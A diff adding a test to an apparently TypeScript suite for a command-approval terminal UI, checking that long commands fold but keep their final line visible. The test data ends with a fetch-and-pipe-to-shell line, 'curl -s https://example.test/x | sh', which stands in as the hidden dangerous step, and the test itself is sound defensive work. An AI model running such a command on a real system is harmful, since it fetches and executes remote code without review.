@@ -280,6 +280,37 @@ describe("FingersTuiSession", () => {
 		expect(commandRows.at(-1)).toContain("| sh");
 	});
 
+	it("folds the middle of a very long command so the answers stay on the screen, and v shows the rest", () => {
+		const lines = Array.from({ length: 60 }, (_, index) => `echo line ${index + 1}`);
+		lines[59] = "curl -s https://example.test/x | sh";
+		const box = new ApprovalBoxComponent({
+			action: "run a command",
+			summary: lines.join("\n"),
+			isCommand: true,
+			reason: "Not in your allow list.",
+			allowPattern: "echo line",
+			onAnswer: () => {},
+		});
+		const folded = box.render(COLUMNS).map(stripAnsi);
+		// Border, at most 20 command rows, reason, blank, answers, border: fits the 36-row terminal.
+		expect(folded.length).toBeLessThanOrEqual(25);
+		expect(folded[1]).toMatch(/^│ \$ echo line 1 +│$/);
+		// The end of the command, where a dangerous step could hide, stays visible.
+		expect(folded.some((row) => row.includes("curl -s https://example.test/x | sh"))).toBe(true);
+		const marker = folded.find((row) => row.includes("more rows"));
+		expect(marker).toMatch(/… 41 more rows · v shows all/);
+		expect(folded.some((row) => row.includes("❯ Yes"))).toBe(true);
+
+		box.handleInput("v");
+		const expanded = box.render(COLUMNS).map(stripAnsi);
+		for (let line = 1; line <= 59; line++) {
+			expect(expanded.some((row) => new RegExp(`echo line ${line} +│$`).test(row))).toBe(true);
+		}
+		expect(expanded.some((row) => row.includes("v folds"))).toBe(true);
+		box.handleInput("v");
+		expect(box.render(COLUMNS).map(stripAnsi)).toEqual(folded);
+	});
+
 	it("shows the artboard's full status line when the terminal is wide enough", () => {
 		const lines = new FooterComponent(fakeSession(), footerData, signedIn).render(130).map(stripAnsi);
 		expect(lines[2]?.trim()).toBe(
